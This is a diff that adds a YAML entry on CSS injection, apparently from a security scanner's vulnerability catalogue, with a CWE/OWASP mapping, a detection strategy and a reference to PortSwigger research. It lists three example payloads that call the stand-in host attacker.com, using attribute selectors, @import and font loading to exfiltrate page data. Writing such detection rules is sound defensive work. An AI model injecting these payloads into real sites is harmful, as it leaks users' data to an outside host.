@@ -1,0 +1,20 @@
+id: CSS_INJECTION
+name: CSS Injection
+cwe:
+- CWE-79
+owasp: A03:2021 Injection
+severity_range: Medium
+description: Injecting CSS to exfiltrate data via attribute selectors, font loading, or visual deception.
+detection:
+  payloads:
+  - 'input[value^="a"] { background: url(//attacker.com/a) }'
+  - '@import url(//attacker.com/styles.css)'
+  - 'body { font-family: url(//attacker.com/font) }'
+  strategy:
+  - Find points where user input is reflected in <style> tags or style attributes
+  - Inject attribute-selector CSS that fetches external resources character-by-character
+  - Test @import to load external stylesheets
+  - Test font-loading for data exfiltration
+evidence_needed: Data exfiltration via CSS attribute selectors or external resource loading
+references:
+- https://portswigger.net/research/blind-css-exfiltration
